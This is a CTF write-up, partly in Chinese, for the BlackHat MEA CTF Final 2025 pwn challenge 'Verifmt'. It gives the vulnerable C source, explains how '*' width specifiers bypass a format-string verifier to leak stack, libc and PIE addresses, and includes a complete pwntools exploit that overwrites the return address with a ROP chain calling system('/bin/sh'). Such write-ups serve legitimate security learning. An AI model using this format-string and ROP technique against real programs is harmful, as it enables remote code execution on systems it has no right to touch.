---
title: "Write-ups: BlackHat MEA CTF Final 2025"
published: 2025-12-02
updated: 2025-12-03
description: "Write-ups for BlackHat MEA CTF Final 2025 pwn aspect."
image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.2yysscpa8n.avif"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# Verifmt

## Information

- Category: Pwn

## Description

> Verifmt is a format string converter with a powerful verifier.

## Write-up

题目给了源码，还是很方便的：

```c
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int verify_fmt(const char *fmt, size_t n_args) {
  size_t argcnt = 0;
  size_t len = strlen(fmt);

  for (size_t i = 0; i < len; i++) {
    if (fmt[i] == '%') {
      if (fmt[i+1] == '%') {
        i++;
        continue;
      }

      if (isdigit(fmt[i+1])) {
        puts("[-] Positional argument not supported");
        return 1;
      }

      if (argcnt >= n_args) {
        printf("[-] Cannot use more than %lu specifiers\n", n_args);
        return 1;
      }

      argcnt++;
    }
  }

  return 0;
}

int main() {
  size_t n_args;
  long args[4];
  char fmt[256];

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  while (1) {
    /* Get arguments */
    printf("# of args: ");
    if (scanf("%lu", &n_args) != 1) {
      return 1;
    }

    if (n_args > 4) {
      puts("[-] Maximum of 4 arguments supported");
      continue;
    }

    memset(args, 0, sizeof(args));
    for (size_t i = 0; i < n_args; i++) {
      printf("args[%lu]: ", i);
      if (scanf("%ld", args + i) != 1) {
        return 1;
      }
    }

    /* Get format string */
    while (getchar() != '\n');
    printf("Format string: ");
    if (fgets(fmt, sizeof(fmt), stdin) == NULL) {
      return 1;
    }

    /* Verify format string */
    if (verify_fmt(fmt, n_args)) {
      continue;
    }

    /* Enjoy! */
    printf(fmt, args[0], args[1], args[2], args[3]);
  }

  return 0;
}
```

发现只是对格式化字符串做了一些限制，不能利用位置参数泄漏指定值，再者就是最多只能使用四个格式化字符串标志符（以 `%` 打头算一个），且格式化字符串格式也是固定为 `printf(fmt, args[0], args[1], args[2], args[3]);`，但是传入 `printf` 的所有参数都是可控的。

这题基本上只要搞明白怎么泄漏地址就赢了，涉及到一个 `*` 参数的概念，如果我们输入 `%*.*p%*.*p`，这四个 `*` 就会分别用 `args[0] ~ args[4]` 为参数，且 `p` 也各占一个参数位，此时我们只使用了两个 `%` 标识符，就已经消耗了六个参数，另外还剩两次机会。好巧不巧，栈上就有一个地址，正好是第七个参数，所以直接再加一个 `%p` 泄漏即可。

![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.8dxbarni09.avif)

泄漏了栈地址我们就知道返回地址，调试发现返回地址处保存的正好是 libc 地址，我们可以直接控制 `rsi` 为返回地址，`fmt` 为 `%s` 以此泄漏 libc，之后就随便打打了。

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    context,
    flat,
    process,
    raw_input,
    remote,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", action="store_true")
parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
args = parser.parse_args()


FILE = "./chall_patched"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc


def set_args(cnt, *args_values, fmt):
    target.sendlineafter(b"# of args: ", str(cnt).encode())

    for i, val in enumerate(args_values):
        if val is not None:
            prompt = f"args[{i}]: "
            target.sendlineafter(prompt.encode(), str(val).encode())

    # raw_input("DEBUG")
    target.sendlineafter(b"Format string: ", fmt)


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch():
    global target, targets

    if args.L and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.L:
        target = process(FILE)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        targets = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
        target = targets[0]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    launch()

    set_args(4, 1, 2, 3, 4, fmt=b"%*.*p%*.*p %p")

    target.recvuntil(b" ")
    stack = int(target.recvline(), 16)
    pie = stack + 0x158
    ret = stack + 0x170

    target.success(f"stack: {hex(stack)}")
    target.success(f"pie: {hex(pie)}")
    target.success(f"ret: {hex(ret)}")

    set_args(1, ret, fmt=b"%s")
    libc.address = int.from_bytes(target.recv(0x6), "little") - 0x29D90

    set_args(1, pie, fmt=b"%s")
    elf.address = int.from_bytes(target.recv(0x6), "little") - 0x1160

    target.success(f"libc: {hex(libc.address)}")
    target.success(f"pie: {hex(elf.address)}")

    pop_rdi_ret = elf.address + 0x0000000000001282
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]
    align = elf.address + 0x000000000000101A

    set_args(3, pop_rdi_ret & 0xFFFF, 0, ret, fmt=b"%*c%hn")
    set_args(3, (pop_rdi_ret >> 16) & 0xFFFF, 0, ret + 2, fmt=b"%*c%hn")
    set_args(3, (pop_rdi_ret >> 32) & 0xFFFF, 0, ret + 4, fmt=b"%*c%hn")
    set_args(3, binsh & 0xFFFF, 0, ret + 0x8, fmt=b"%*c%hn")
    set_args(3, (binsh >> 16) & 0xFFFF, 0, ret + 0x8 + 2, fmt=b"%*c%hn")
    set_args(3, (binsh >> 32) & 0xFFFF, 0, ret + 0x8 + 4, fmt=b"%*c%hn")
    set_args(3, align & 0xFFFF, 0, ret + 0x10, fmt=b"%*c%hn")
    set_args(3, (align >> 16) & 0xFFFF, 0, ret + 0x10 + 2, fmt=b"%*c%hn")
    set_args(3, (align >> 32) & 0xFFFF, 0, ret + 0x10 + 4, fmt=b"%*c%hn")
    set_args(3, system & 0xFFFF, 0, ret + 0x18, fmt=b"%*c%hn")
    set_args(3, (system >> 16) & 0xFFFF, 0, ret + 0x18 + 2, fmt=b"%*c%hn")
    set_args(3, (system >> 32) & 0xFFFF, 0, ret + 0x18 + 4, fmt=b"%*c%hn")

    target.sendlineafter(b"# of args: ", b"A")
    target.interactive()


if __name__ == "__main__":
    main()
```
